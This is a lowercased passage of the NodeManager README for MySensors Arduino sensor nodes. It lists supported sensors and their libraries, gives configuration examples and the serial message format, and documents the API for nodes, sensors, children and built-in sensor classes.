water meter pulse sensor -\nsensorplantowerpms 3 plantower pms particulate matter sensors (reporting pm<=1.0, pm<=2.5 and pm<=10.0 in \u00b5g/m\u00b3) https://github.com/fu-hsi/pms\nsensorvl53l0x 1 vl53l0x laser time-of-flight distance sensor via i\u00b2c, sleep pin supported (optional) https://github.com/pololu/vl53l0x-arduino\ndisplayssd1306 1 ssd1306 128x64 oled display (i\u00b2c); by default displays values of all sensors and children https://github.com/greiman/ssd1306ascii.git\nsensorsht31 2 sht31 sensor, return temperature/humidity based on the attached sht31 sensor https://github.com/adafruit/adafruit_sht31\nsensorsi7021 2 si7021 sensor, return temperature/humidity based on the attached si7021 sensor https://github.com/sparkfun/sparkfun_si701_breakout_arduino_library\nsensorchirp 3 chirp soil moisture sensor (includes temperature and light sensors) https://github.com/apollon77/i2csoilmoisturesensor\ndisplayhd44780 1 supports most hitachi hd44780 based lcds, by default displays values of all sensors and children https://github.com/cyberang3l/newliquidcrystal\nsensorttp 1 ttp226/ttp229 touch control sensor -\nsensorservo 1 control a generic servo motor sensor -\nsensorapds9960 1 sparkfun rgb and gesture sensor https://github.com/sparkfun/apds-9960_rgb_and_gesture_sensor\nsensorneopixel 1 control a neopixel led https://github.com/adafruit/adafruit_neopixel\nsensorsds011 2 sds011 air quality sensor, return concentrations of 2.5 and 10 micrometer particles. https://github.com/ricki-z/sds011\nsensorfpm10a 1 fpm10a fingerprint sensor https://github.com/adafruit/adafruit-fingerprint-sensor-library\nsensorph 1 ph ( sku sen161 ) sensor, measure the analog value from the amplifier module -\nsensorpca9685w 2 generic dimmer sensor (s_dimmer) used to drive a single channel pwm output of pca9685 https://github.com/adafruit/adafruit-pwm-servo-driver-library\nsensorpca9685rgb 2 generic rgb-dimmer sensor (s_rgb_light) used to drive rgb resp. 3-channel pwm output of pca9685 https://github.com/adafruit/adafruit-pwm-servo- driver-library\nsensorpca9685rgbw 2 generic rgbw-dimmer sensor (s_rgbw_light) used to drive rgbw resp. 4-channel pwm output of pca9685 https://github.com/adafruit/adafruit-pwm-servo-driver-library\nsensordsm501a 1 dust sensor module dsm501a for pm1.0 and pm2.5 particles -\nsensorpn532 1 pn532 nfc rfid module https://github.com/elechouse/pn532\nsensorccs811 1 ccs811 gas/air quality sensor. measure voc and eco2 https://github.com/adafruit/adafruit_ccs811\nsensormpr121 1 mpr121-based capacitive touch control sensor https://github.com/adafruit/adafruit_mpr121\nsensorgsm 1 send sms through an attached serial modem (e.g. sim900) -\nthose sensors requiring a pin to operate would take it as an argument in the constructor. nodemanager automatically creates all the child_ids, assigning an incremental counter. if you need to set your own child_id, pass it as the last argument to the constructor\nexamples:\n// add a thermistor sensor attached to pin a0\n#include <sensors/sensorthermistor.h>\nsensorthermistor thermistor(a0);\n// add a ldr sensor attached to pin a0 and assing child_id 5\n#include <sensors/sensorldr.h>\nsensorldr ldr(a1,5);\n// add a temperature/humidity sensor sht21 sensor. no pin required since using i2c\n#include <sensors/sensorsht21.h>\nsensorsht21 sht21;\nthe sensor will be then registered automatically with nodemanager which will take care of it all along its lifecycle. nodemanager will present each sensor for you to the controller, query each sensor and report the measure back to the gateway/controller. for actuators (e.g. relays) those can be triggered by sending a req/set message with the expected type to their assigned child id.\ninstalling the dependencies\nsome of the sensors and buit-in capabilities rely on third party libraries. those libraries are not included within nodemanager and have to be installed from the arduino ide library manager (sketch -> include library -> manager libraries) or manually. you need to install the library only if you are planning to enable to use the sensor.\nconfigure your sensors\nnodemanager and all the sensors can be configured from within before() in the main sketch. find configure your sensors below to customize the behavior of any sensor by invoking one of the functions available.\nexamples:\n// report measures of every attached sensors every 10 minutes\nnodemanager.setreportintervalminutes(10);\n// set the node to sleep in 5 minutes cycles\nnodemanager.setsleepminutes(5);\n// report battery level every 10 minutes\nbattery.setreportintervalminutes(10);\n// set an offset to -1 to a thermistor sensor\nthermistor.setoffset(-1);\n// change the id of a the first child of a sht21 sensor\nsht21.children.get(1)->child_id = 5;\n// power all the nodes through dedicated pins\nnodemanager.setpowermanager(power);\nif not instructed differently, the node will stay awake and all the sensors will report every 10 minutes, battery level and signal level will be automatically reported every 60 minutes (if the corresponding sensors have been added).\nplease note, if you configure a sleep cycle, this may have an impact on the reporting interval since the sensor will be able to report its measures only when awake. for example if you set a report interval of 5 minutes and a sleep cycle of 10 minutes, the sensors will report every 10 minutes.\nrunning your code\nonce finished configuring your node, upload your sketch to your arduino board as you are used to.\ncheck your gateway's logs to ensure the node is working as expected. you should see the node presenting itself, presenting all the registered sensors and reporting new measures at the configured reporting interval. when nodemanager_debug is enabled, detailed information will be available through the serial port. the better understand the logs generaged by nodemanager, paste them into mysensors log parser (https://mysensors.org/build/parser). remember to disable debug once the tests have been completed to save additional storage.\ncommunicate with the sensors\nyou can interact with each registered sensor by sending to the child id a req command (or a set for output sensors like relays). for example to request the temperature to node_id 254 and child_id 1:\n254;1;2;0;0;\nto activate a relay connected to the same node, child_id 100 we need to send a set command with payload set to 1:\n254;100;1;0;2;1\nno need to implement anything on your side since for built-in sensors this is handled automatically.\napi\nyou can interact with each class provided by nodemanager through a set of api functions.\nnodemanager api\n// instantiate a nodemanager object. an optional fixed number of sensors can be passed as an argument\nnodemanager(uint8_t sensorcount = 0);\n// [10] send the same message multiple times (default: 1)\nvoid setretries(uint8_t value);\n// [21] set this to true if you want destination node to send ack back to this node (default: false)\nvoid setack(bool value);\nbool getack();\n// request the controller's configuration on startup (default: true)\nvoid setgetcontrollerconfig(bool value);\n// [22] manually set ismetric setting\nvoid setismetric(bool value);\nbool getismetric();\n// convert a temperature from celsius to fahrenheit depending on how ismetric is set\nfloat celsiustofahrenheit(float temperature);\n// return true if sleep or wait is configured and hence this is a sleeping node\nbool issleepingnode();\n// [1] send a hello message back to the controller\nvoid hello();\n// [6] reboot the board\nvoid reboot();\n// [36] set the default interval in minutes all the sensors will report their measures. if the same function is called on a specific sensor, this will not change the previously set value. on sleeping sensors, the elapsed time can be evaluated only upon wake up (default: 10 minutes)\nvoid setreportintervalseconds(unsigned long value);\nunsigned long getreportintervalseconds();\n// [37] set the default interval in minutes all the sensors will report their measures. if the same function is called on a specific sensor, this will not change the previously set value. on sleeping sensors, the elapsed time can be evaluated only upon wake up (default: 10 minutes)\nvoid setreportintervalminutes(unsigned long value);\n// [38] set the default interval in minutes all the sensors will report their measures. if the same function is called on a specific sensor, this will not change the previously set value. on sleeping sensors, the elapsed time can be evaluated only upon wake up (default: 10 minutes)\nvoid setreportintervalhours(unsigned int value);\n// [39] set the default interval in minutes all the sensors will report their measures. if the same function is called on a specific sensor, this will not change the previously set value. on sleeping sensors, the elapsed time can be evaluated only upon wake up (default: 10 minutes)\nvoid setreportintervaldays(uint8_t value);\n// [30] if set and when the board is battery powered, sleep() is always called instead of wait() (default: true)\nvoid setsleeporwait(bool value);\n// sleep if the node is a battery powered or wait if it is not for the given number of milliseconds\nvoid sleeporwait(unsigned long value);\n// [31] set which pin is connected to rst of the board to reboot the board when requested. if not set the software reboot is used instead (default: -1)\nvoid setrebootpin(int8_t value);\n// [32] turn the adc off so to save 0.2 ma\nvoid setadcoff();\n// send a message by providing the source child, type of the message and value\nvoid sendmessage(uint8_t child_id, uint8_t type, int value);\nvoid sendmessage(uint8_t child_id, uint8_t type, float value, uint8_t precision);\nvoid sendmessage(uint8_t child_id, uint8_t type, double value, uint8_t precision);\nvoid sendmessage(uint8_t child_id, uint8_t type, const char* value);\n// register a sensor\nvoid registersensor(sensor* sensor);\n#if nodemanager_sleep == on\n// register a timer\nvoid registertimer(timer* timer);\n#endif\n// return the next-available child id\nuint8_t getavailablechildid(uint8_t child_id = 0);\n// list containing all the registered sensors\nlist<sensor*> sensors;\n// return the child object of the given child_id\nchild* getchild(uint8_t child_id);\n// return the sensor object of the given child_id\nsensor* getsensorwithchild(uint8_t child_id);\n// sleep between send()\nvoid sleepbetweensend();\n// set the analog reference to the given value and optionally perform some fake reading on the given pin\nvoid setanalogreference(uint8_t value, uint8_t pin = -1);\n#if nodemanager_sleep == on\n// [3] set the duration (in seconds) of a sleep cycle\nvoid setsleepseconds(unsigned long value);\nunsigned long getsleepseconds();\n// [4] set the duration (in minutes) of a sleep cycle\nvoid setsleepminutes(unsigned long value);\n// [5] set the duration (in hours) of a sleep cycle\nvoid setsleephours(unsigned int value);\n// [29] set the duration (in days) of a sleep cycle\nvoid setsleepdays(uint8_t value);\n// [20] optionally sleep interval in milliseconds before sending each message to the radio network (default: 0)\nvoid setsleepbetweensend(unsigned int value);\n// [9] wake up the board\nvoid wakeup();\n// use smart sleep for sleeping boards (default: true)\nvoid setsmartsleep(bool value);\n#endif\n#if nodemanager_interrupts == on\n// [19] if enabled, when waking up from the interrupt, the board stops sleeping. disable it when attaching e.g. a motion sensor (default: true)\nvoid setsleepinterruptpin(int8_t value);\n// configure the interrupt pin and mode. mode can be change, rising, falling (default: mode_not_defined)\nvoid setinterrupt(int8_t pin, uint8_t mode, int8_t initial = -1);\n// [28] ignore two consecutive interrupts if happening within this timeframe in milliseconds (default: 100)\nvoid setinterruptdebounce(unsigned long value);\n// return the pin from which the last interrupt came\nint8_t getlastinterruptpin();\n// return the value of the pin from which the last interrupt came\nint8_t getlastinterruptvalue();\n#endif\n#if nodemanager_power_manager == on\n// configure a powermanager common to all the sensors\nvoid setpowermanager(powermanager& powermanager);\n// to save battery the sensor can be optionally connected to two pins which will act as vcc and ground and activated on demand\nvoid setpowerpins(int8_t ground_pin, int8_t vcc_pin, unsigned long wait_time = 50);\n// [24] manually turn the power on\nvoid poweron();\n// [25] manually turn the power off\nvoid poweroff();\n#endif\n#if nodemanager_eeprom == on\n// [7] clear the eeprom\nvoid cleareeprom();\n// return the value stored at the requested index from the eeprom\nint loadfrommemory(int index);\n// [27] save the given index of the eeprom the provided value\nvoid savetomemory(int index, int value);\n// [40] if set save the sleep settings in memory, also when changed remotely (default: false)\nvoid setsavesleepsettings(bool value);\n#endif\n#if nodemanager_time == on\n// [41] synchronize the local time with the controller\nvoid synctime();\n// [42] returns the current system time\nunsigned long gettime();\n// [43] set the hour offset for when syncronizing the time (default: 0)\nvoid settimezone(int8_t value);\n// request the current time to the controller during setup(). time with a rtc if configured is always synchronized (default: true)\nvoid setsynctimeonsetup(bool value);\n// request the current time to the controller just after a sleep cycle. time with a rtc if configured is always synchronized (default: true)\nvoid setsynctimeaftersleep(bool value);\n// request the current time to the controller after the configured number of minutes (default: 0)\nvoid setsynctimeafterinterval(unsigned long value);\n// receivetime() callback\nvoid receivetime(unsigned long ts);\n#endif\n#if nodemanager_sd == on\n// sd card variables\nsd2card sd_card;\nsdvolume sd_volume;\nsdfile sd_root;\nsdfile sd_file;\n#endif\n// hook into the main sketch functions\nvoid before();\nvoid presentation();\nvoid setup();\nvoid loop();\n#if nodemanager_receive == on\nvoid receive(const mymessage & msg);\nsensor api\nthe following methods are available for all the sensors:\nsensor(int8_t pin = -1);\n// return the name of the sensor\nconst char* getname();\n// [1] where the sensor is attached to (default: not set)\nvoid setpin(int8_t value);\n// [5] for some sensors, the measurement can be queried multiple times and an average is returned (default: 1)\nvoid setsamples(unsigned int value);\n// [6] if more then one sample has to be taken, set the interval in milliseconds between measurements (default: 0)\nvoid setsamplesinterval(unsigned long value);\n// [17] after how many seconds the sensor will report back its measure (default: 10 minutes)\nvoid setreportintervalseconds(unsigned long value);\n// [16] after how many minutes the sensor will report back its measure (default: 10 minutes)\nvoid setreportintervalminutes(unsigned long value);\n// [19] after how many hours the sensor will report back its measure (default: 10 minutes)\nvoid setreportintervalhours(unsigned int value);\n// [20] after how many days the sensor will report back its measure (default: 10 minutes)\nvoid setreportintervaldays(uint8_t value);\n// [24] set the way the timer used for reporting to the gateway should operate. it can be either time_interval (e.g. report every x seconds with the amount of time set with setreporttimervalue()), immediately (e.g. report at every cycle, useful for sensors like actuators which should report as soon as the value has changed), do_not_report (e.g. never report, useful for when there is no need to report, like a display) and when nodemanager_time is on, every_minute/every_hour/every_day (e.g. to report the value set in the previous timeframe, useful for sensors reporting an accumulated value linked to a timeframe at regular intervals), at_minute/at_hour/at_day (e.g. report at a given minute/hour/day, useful if the measure is expected at a specified time, set with setreporttimervalue())\nvoid setreporttimermode(timer_mode value);\n// [25] set the value for the reporting timer's mode which has been set with setreporttimermode()\nvoid setreporttimervalue(unsigned long value);\n// [26] set the way the timer used for taking measures should operate. takes the same parameters as setreporttimermode(). if not set explicitly, will be set as the reporting timer\nvoid setmeasuretimermode(timer_mode value);\n// [27] set the value for the reporting timer's mode which has been set with setreporttimermode() if not set explicitely, will be set with the same value as the reporting timer\nvoid setmeasuretimervalue(unsigned long value);\n// list of configured child\nlist<child*> children;\n// return the child object based on the provided child_id\nchild* getchild(uint8_t child_id);\n// register a child\nvoid registerchild(child* child);\n#if nodemanager_interrupts == on\n// return the pin the interrupt is attached to\nint8_t getinterruptpin();\n// set initial value of the configured pin. can be used for internal pull up\nvoid setpininitialvalue(int8_t value);\n// for interrupt-based sensor, set the interrupt mode. can be change, rising, falling (default: change)\nvoid setinterruptmode(uint8_t value);\n// [22] for interrupt-based sensor, milliseconds to wait/sleep after the interrupt before reporting (default: 0)\nvoid setwaitafterinterrupt(unsigned long value);\n// [23] for interrupt-based sensor, the value of the pin is checked and the interrupt ignored if rising and not high or falling and not low (default: true)\nvoid setinterruptstrict(bool value);\n#endif\n#if nodemanager_power_manager == on\n// set a previously configured powermanager to the sensor so to powering it up with custom pins\nvoid setpowermanager(powermanager& powermanager);\n// to save battery the sensor can be optionally connected to two pins which will act as vcc and ground and activated on demand\nvoid setpowerpins(int8_t ground_pin, int8_t vcc_pin, unsigned long wait_time = 50);\n// [13] manually turn the power on\nvoid poweron();\n// [14] manually turn the power off\nvoid poweroff();\n#endif\n#if nodemanager_hooking == on\n// set a custom hook function to be called when the sensor executes its setup() function\nvoid setsetuphook(void (*function)(sensor* sensor));\n// set a custom hook function to be called just before the sensor executes its loop() function\nvoid setpreloophook(void (*function)(sensor* sensor));\n// set a custom hook function to be called just after the sensor executes its loop() function\nvoid setpostloophook(void (*function)(sensor* sensor));\n// set a custom hook function to be called when the sensor executes its interrupt() function\nvoid setinterrupthook(void (*function)(sensor* sensor));\n// set a custom hook function to be called when the sensor executes its receive() function\nvoid setreceivehook(void (*function)(sensor* sensor, mymessage* message));\n#endif\n// define what to do at each stage of the sketch\nvoid presentation();\nvoid setup();\nvoid loop(mymessage* message);\n#if nodemanager_interrupts == on\nbool interrupt();\n#endif\n#if nodemanager_receive == on\nvoid receive(mymessage* message);\n#endif\n// abstract functions, subclasses may implement\nvirtual void onsetup();\nvirtual void onloop(child* child);\nvirtual void onreceive(mymessage* message);\nvirtual void oninterrupt();\n#if nodemanager_ota_configuration == on\nvirtual void onotaconfiguration(configurationrequest* request);\n#endif\nchild api\nthe following methods are available for all the child:\nchild(sensor* sensor, value_format format, uint8_t child_id, uint8_t presentation, uint8_t type, const char* description = \"\");\n// set child id used to communicate with the gateway/controller\nvoid setchildid(uint8_t value);\nuint8_t getchildid();\n// set sensor format\nvoid setformat(value_format value);\nvalue_format getformat();\n// set sensor presentation (default: s_custom)\nvoid setpresentation(uint8_t value);\nuint8_t getpresentation();\n// set sensor type (default: v_custom)\nvoid settype(uint8_t value);\nuint8_t gettype();\n// set how many decimal digits to use (default: 2 for childfloat, 4 for childdouble)\nvoid setfloatprecision(uint8_t value);\n// set sensor description\nvoid setdescription(const char* value);\nconst char* getdescription();\n// configure the behavior of the child when setvalue() is called multiple times. it can be none (ignore the previous values but the last one), avg (averages the values), sum (sum up the values) (default: avg)\nvoid setvalueprocessing(child_processing value);\n// send the value to the gateway even if there have been no samples collected (default: false)\nvoid setsendwithoutvalue(bool value);\n// set the value of the child\nvoid setvalue(int value);\nvoid setvalue(float value);\nvoid setvalue(double value);\nvoid setvalue(const char* value);\n// get the value of the child\nint getvalueint();\nfloat getvaluefloat();\ndouble getvaluedouble();\nconst char* getvaluestring();\n// check if the value must be sended back to the controller\nbool valuereadytosend();\n// send the current value to the gateway\nvoid sendvalue(bool force = 0);\n// print the current value on a lcd display\nvoid print(print& device);\n// reset all the counters\nvoid reset();\n#if nodemanager_conditional_report == on\n// force to send an update after the configured number of minutes\nvoid setforceupdatetimervalue(unsigned long value);\n// never report values below this threshold (default: -flt_max)\nvoid setminthreshold(float value);\n// never report values above this threshold (default: flt_max)\nvoid setmaxthreshold(float value);\n// do not report values if too close to the previous one (default: 0)\nvoid setvaluedelta(float value);\n// set when the last value is updated. possible values are update_always (at every cycle), update_on_send (only after sending) (default: update_on_send)\nvoid setupdatelastvalue(last_value_mode value);\n// get the last value of the child\nint getlastvalueint();\nfloat getlastvaluefloat();\ndouble getlastvaluedouble();\nconst char* getlastvaluestring();\n#endif\n#if nodemanager_eeprom == on\n// persist the child's value in eeprom. the value will be saved at each update and loaded at boot time (default: false)\nvoid setpersistvalue(bool value);\nbool getpersistvalue();\n// load old value from eeprom\nvoid loadvalue();\n// load current value to eeprom\nvoid savevalue();\n#endif\nbuilt-in sensors api\neach sensor class may expose additional methods.\nsensorbattery\n// [102] the expected vcc when the batter is fully discharged, used to calculate the percentage (default: 2.7)\nvoid setminvoltage(float value);\n// [103] the expected vcc when the batter is fully charged, used to calculate the percentage (default: 3.3)\nvoid setmaxvoltage(float value);\n// [104] if true, the battery level will be evaluated by measuring the internal vcc without the need to connect any pin, if false the voltage divider methon will be used (default: true)\nvoid setbatteryinternalvcc(bool value);\n// [105] if setbatteryinternalvcc() is set to false, the analog pin to which the battery's vcc is attached (https://www.mysensors.org/build/battery) (default: -1)\nvoid setbatterypin(int8_t value);\n// [106] if setbatteryinternalvcc() is set to false, the volts per bit ratio used to calculate the battery voltage (default: 0.003363075)\nvoid setbatteryvoltsperbit(float value);\n// [107] change battery voltage calibration factor\nvoid setbatterycalibrationfactor(float value);\n// if true call sendbatterylevel() in addition to send the measured voltage back (default: true)\nvoid setsendbatterylevel(bool value);\nsensorsignal\n// [101] define which signal report to send. possible values are sr_uplink_quality, sr_tx_power_level, sr_tx_power_percent, sr_tx_rssi, sr_rx_rssi, sr_tx_snr, sr_rx_snr (default: sr_rx_rssi)\nvoid setsignalcommand(int value);\nsensoranaloginput / sensorldr / sensorrain / sensorsoilmoisture\n// [101] the analog reference to use (default: not set, can be either internal or default)\nvoid setreference(int value);\n// [102] reverse the value or the percentage (e.g. 70% -> 30%) (default: false)\nvoid setreverse(bool value);\n// [103] when true returns the value as a percentage (default: true)\nvoid setoutputpercentage(bool value);\n// [104] minimum value for calculating the percentage (default: 0)\nvoid setrangemin(int value);\n// [105] maximum value for calculating the percentage (default: 1024)\nvoid setrangemax(int value);\nsensorthermistor\n// [101] resistance at 25 degrees c (default: 10000)\nvoid setnominalresistor(long value);\n// [102] temperature for nominal resistance (default: 25)\nvoid setnominaltemperature(int value);\n// [103] the beta coefficient of the thermistor (default: 3950)\nvoid setbcoefficient(int value);\n// [104] the value of the resistor in series with the thermistor (default: 10000)\nvoid setseriesresistor(long value);\n// [105] set a temperature offset\nvoid setoffset(float value);\nsensoracs712\n// [101] set how many mv are equivalent to 1 amp. the value depends on the module (185 for 5a module, 100 for 20a module, 66 for 30a module) (default: 185);\nvoid setmvperamp(int value);\n// [102] set acs offset (default: 2500);\nvoid setoffset(int value);\n// [103] set ac measurement mode\nvoid setacmode(bool value);\n// [104] set ac noise\nvoid setacnoise(int value);\n// [105] adjust ac noise\nvoid computeacnoise();\nsensordigitalinput\n// invert the value to report. e.g. report 1 if value is low, report 0 if high (default: false)\nvoid setinvertvaluetoreport(bool value);\n// set optional internal pull up/down\nvoid setinitialvalue(int value);\nsensordigitaloutput / sensorrelay / sensorlatchingrelay1pin / sensorlatchingrelay2pins\n// [104] when legacy mode is enabled expect a req message to trigger, otherwise the default set (default: false)\nvoid setlegacymode(bool value);\n// [105] automatically turn the output off after the given number of minutes\nvoid setsafeguard(int value);\n// [106] if true the input value becomes a duration in minutes after which the output will be automatically turned off (default: false)\nvoid setinputiselapsed(bool value);\n// [107] optionally wait for the given number of milliseconds after changing the status (default: 0)\nvoid setwaitafterset(int value);\n// [108] when switching on, turns the output off after the given number of milliseconds. for latching relay controls the pulse width (default: 0)\nvoid setpulsewidth(int value);\n// [109] invert the value to write. e.g. if on is received, write low (default: false)\nvoid setinvertvaluetowrite(bool value);\n// [110] for a 2-pins latching relay, set the pin which turns the relay off (default: -1)\nvoid setpinoff(int8_t value);\n// manually switch the output to the provided status (on or off)\nvoid setstatus(int value);\n// toggle the status\nvoid togglestatus(int value);\nsensorinterrupt / sensordoor / sensormotion\n// [105] invert the value to report. e.g. if falling and value is low, report high (default: false)\nvoid setinvertvaluetoreport(bool value);\n#if nodemanager_time == on\n// [107] when keeping track of the time, trigger only after x consecutive interrupts within the same minute (default: 1)\nvoid setthreshold(int value);\n#endif\nsensords18b20\n// returns the sensor's resolution in bits\nint getresolution();\n// [101] set the sensor's resolution in bits\nvoid setresolution(int value);\n// [102] sleep while ds18b20 calculates temperature (default: false)\nvoid setsleepduringconversion(bool value);\n// return the sensors' device address\ndeviceaddress* getdeviceaddress();\nsensorbh1750\n// [101] set sensor reading mode, e.g. bh1750_one_time_high_res_mode\nvoid setmode(uint8_t mode);\nsensorbme280 / sensorbmp085 / sensorbmp280\n// [101] define how many pressure samples to keep track of for calculating the forecast (default: 5)\nvoid setforecastsamplescount(int value);\nsensorbme280\n// set custom sampling to the sensor\nvoid setsampling(adafruit_bme280::sensor_mode mode, adafruit_bme280::sensor_sampling tempsampling, adafruit_bme280::sensor_sampling presssampling, adafruit_bme280::sensor_sampling humsampling, adafruit_bme280::sensor_filter filter, adafruit_bme280::standby_duration duration);\nsensorsonoff\n// [101] set the button's pin (default: 0)\nvoid setbuttonpin(int8_t value);\n// [102] set the relay's pin (default: 12)\nvoid setrelaypin(int8_t value);\n// [103] set the led's pin (default: 13)\nvoid setledpin(int8_t value);\nsensorhcsr04\n// [103] maximum distance we want to ping for (in centimeters) (default: 300)\nvoid setmaxdistance(int value);\n// [104] report the measure even if is invalid (e.g. 0) (default: true)\nvoid setreportifinvalid(bool value);\nsensormq\n// [102] set the load resistance on the board, in ohms (default: 1000);\nvoid setrlvalue(float value);\n// [103] set the ro resistance in ohms. by default will be calculated at startup during the calibration phase using the known ppm provided\nvoid setrovalue(float value);\n// [104] set the ppm used during the calibration (default: 411);\nvoid setknownppm(float value);\n// [105] define how many samples we are going to take in the calibration phase (default: 50);\nvoid setcalibrationsamples(int value);\n// [106] define the time (in milisecond) between each sample in the cablibration phase (default: 500);\nvoid setcalibrationsampleinterval(int value);\n// [107] define how many samples you are going to take in normal operation (default: 50);\nvoid setsamples(int value);\n// [108] define the time (in milisecond) between each sample in the normal operations (default: 5);\nvoid setsampleinterval(int value);\n// [109] set the ppm (x) of a random point on the gas curve (default: 200)\nvoid setpoint1ppm(float value);\n// [110] set the rs/ro ratio (y) of the same random point on the gas curve (default: 5)\nvoid setpoint1ratio(float value);\n// [111] set the ppm (x) of another random point on the gas curve (default: 10000)\nvoid setpoint2ppm(float value);\n// [112] set the rs/ro ratio (y) of the same random point on the gas curve (default: 1.2)\nvoid setpoint2ratio(float value);\n// [113] with ppm = scaling_factor*x^exponent set the value manually, otherwise will be calculated automatically based on the two points provided\nvoid setcurvescalingfactor(float value);\n// [114] with ppm = scaling_factor*x^exponent set the value manually, otherwise will be calculated automatically based on the two points provided\nvoid setcurveexponent(float value);\n// do not report for the given number of minutes, waiting for the sensor to warm up (default: 0);\nvoid setwarmupminutes(int value);\nsensortsl2561\n// [101] set the gain, possible values are sensortsl2561::gain_0x (0), sensortsl2561::gain_16x (1) (default 16x)\nvoid setgain(int value);\n// [102] set the timing, possible values are sensortsl2561::integrationtime_13ms (0), sensortsl2561::integrationtime_101ms (1), sensortsl2561::integrationtime_402ms (2) (default: 13ms)\nvoid settiming(int value);\n// [103] set the spectrum, possible values are sensortsl2561::visible (0), sensortsl2561::fullspectrum (1), sensortsl2561::infrared (2), sensortsl2561::full (3) (default: visible)\nvoid setspectrum(int value);\n// [104] set the i2c address values are sensortsl2561::addr_float, sensortsl2561::addr_low, sensortsl2561::addr_high\nvoid setaddress(int value);\nsensorpt100\n// [101] set the voltageref used to compare with analog measures\nvoid setvoltageref(float value);\nsensorsds011\n// sleep sensor after measurment. this powers down the fan but increases measurment time. (default: true)\nvoid setsleep(bool value);\nsensordimmer\n// [101] set the effect to use for a smooth transition, can be one of sensordimmer::ease_linear, sensordimmer::ease_insine, sensordimmer::ease_outsine, sensordimmer::ease_inoutsine (default: ease_linear)\nvoid seteasing(int value);\n// [102] the duration of entire the transition in seconds (default: 1)\nvoid setduration(int value);\n// [103] the duration of a single step of the transition in milliseconds (default: 100)\nvoid setstepduration(int value);\n// [104] reverse cathod and anode (default: false)\nvoid setreverse(bool value);\n// set the status of the dimmer\nvoid setstatus(int value);\n// set the percentage of the dimmer\nvoid setpercentage(int value);\nsensorpulsemeter / sensorraingauge / sensorpowermeter / sensorwatermeter\n// [102] set how many pulses for each unit (e.g. 1000 pulses for 1 kwh of power, 9 pulses for 1 mm of rain, etc.)\nvoid setpulsefactor(float value);\ndisplayssd1306\n// set device\nvoid setdev(const devtype* dev);\n// set i2c address\nvoid seti2caddress(uint8_t i2caddress);\n// set text font (default: &adafruit5x7)\nvoid setfont(const uint8_t* font);\n// [102] set the contrast of the display (0-255)\nvoid setcontrast(uint8_t value);\n// [104] rotate the display 180 degree (use rotate=false to revert)\nvoid rotatedisplay(bool rotate = true);\n// [105] text font size (possible are 1 and 2; default is 1)\nvoid setfontsize(int fontsize);\n// [106] text caption font size (possible are 1 and 2; default is 2)\nvoid setheaderfontsize(int fontsize);\n// [107] invert display (black text on color background; use invert=false to revert)\nvoid invertdisplay(bool invert = true);\n// set a static caption text on header of the display\nvoid setcaption(const char* value);\n// print a static caption on top of the screen\nvoid printcaption(const char* value);\n// print the given string\nvoid print(const char* value);\n// print the given string and goes to the next line\nvoid println(const char* value);\n// print the value of the given child\nvoid printchild(child* child);\n// clear the display\nvoid clear();\n// set the cursor to the given position\nvoid setcursor(int col,int row);\n// return the display object\nssd1306asciiavri2c* getdisplay();\nsensorchirp\n// [101] set the soil moisture offset (default: 0)\nvoid setmoistureoffset(int value);\n// [102] set the soil moisture range (default: 0)\nvoid setmoisturerange(int value);\n// [103] return the soil moisture normalized (default: false)\nvoid setreturnmoisturenormalized(bool value);\n// [104] reverse the light value (default: true)\nvoid setreturnlightreversed(bool value);\ndisplayhd44780\n// set i2c address (default: 0x38)\nvoid seti2caddress(uint8_t i2caddress);\n// set the backlight (default: high)\nvoid setbacklight(uint8_t value);\n// set a static caption text on header of the display\nvoid setcaption(const char* value);\n// print a static caption on top of the screen\nvoid printcaption(const char* value);\n// print the given string\nvoid print(const char* value);\n// print the given string and goes to the next line\nvoid println(const char* value);\n// print the value of the given child\nvoid printchild(child* child);\n// clear the display\nvoid clear();\n// set the cursor to the given position\nvoid setcursor(int col,int row);\n// return the display object\nliquidcrystal_i2c* getdisplay();\nsensorttp\n// set the passcode length. passcode will be sent to the controller only after this number of digits have been pressed (default: 4)\nvoid setpasscodelength(int value);\n// set the clock pin (default: 6)\nvoid setclockpin(int8_t value);\n// set the sdo pin (default: 5)\nvoid setsdopin(int8_t value);\n// set the dv pin (default: 3)\nvoid setdvpin(int8_t value);\n// set the rst pin (default: 4)\nvoid setrstpin(int8_t value);\nsensorservo\n// set the servo to the given percentage\nvoid setpercentage(int value);\nsensorneopixel\n// set how many neopixels are attached\nvoid setnumpixels(int value);\n// set default brightness\nvoid setdefaultbrightness(int value) {\n// format expected is:\n//<pixel_number from>-<pixel_number to>,<rgb color in a packed 24 bit format>\n//<pixel_number>,<rgb color in a packed 24 bit format>\n//<rgb color in a packed 24 bit format>\nvoid setcolor(char* string);\n// brightness for all leds\nvoid setbrightness(int value)\nsensorfpm10a\n// set the baud rate of the serial port for connecting to the sensor (default: 57600)\nvoid setbaudrate(uint32_t value);\n// set the password for connecting to the sensor (default: 0)\nvoid setpassword(uint32_t value);\n// [101] set the minimum confidence below which the match is not considered valid (default: 0)\nvoid setminconfidence(uint16_t value);\n// [102] wait for a valid fingerprint for the given amount of seconds. useful when battery powered (default: 0)\nvoid setwaitfingerforseconds(int value);\n// return true if the fingerprint was recognized successfully, false otherwise. useful when a hook function needs to act upon the result\nbool getfingerprintisvalid();\nsensorph\n// setting analogrefvalue (default: 5.0)\nvoid setvoltageref(float value);\n// setting the voltage value @ph = 7 (default: 2.52)\nvoid setph7voltage(float value);\n// setting the voltage value @ph = 4 (default: 3.04)\nvoid setph4voltage(float value);\nsensorpca9685w\n// [101] set the effect to use for a smooth transition, can be one of sensordimmer::ease_linear (0), sensordimmer::ease_insine (1), sensordimmer::ease_outsine (2), sensordimmer::ease_inoutsine (3) (default: ease_linear)\nvoid seteasing(int value);\n// [102] the duration of entire the transition in seconds (default: 1)\nvoid setduration(int value);\n// [103] the duration of a single step of the transition in milliseconds (default: 100)\nvoid setstepduration(int value);\n//get instance of pca9685-board\nadafruit_pwmservodriver* getpwmservodriver();\n//set instance of pca9685-board, if using more than one pca9685-dimmer sensor on the same pca9685-board\nvoid setpwmservodriver(adafruit_pwmservodriver* servodriver);\n//set the rgb (red/green/blue) value as hex-string (e.g. 000000...black/off, ff0000...red, 00ff00...green, 0000ff...blue, ffa500...orange, ffffff...white)\nvoid setrgbval(string hexstring);\n//get the current rgb (red/green/blue) value as hex-string\nstring getrgbval();\nsensorpca9685rgb\n// [101] set the effect to use for a smooth transition, can be one of sensordimmer::ease_linear (0), sensordimmer::ease_insine (1), sensordimmer::ease_outsine (2), sensordimmer::ease_inoutsine (3) (default: ease_linear)\nvoid seteasing(int value);\n// [102] the duration of entire the transition in seconds (default: 1)\nvoid 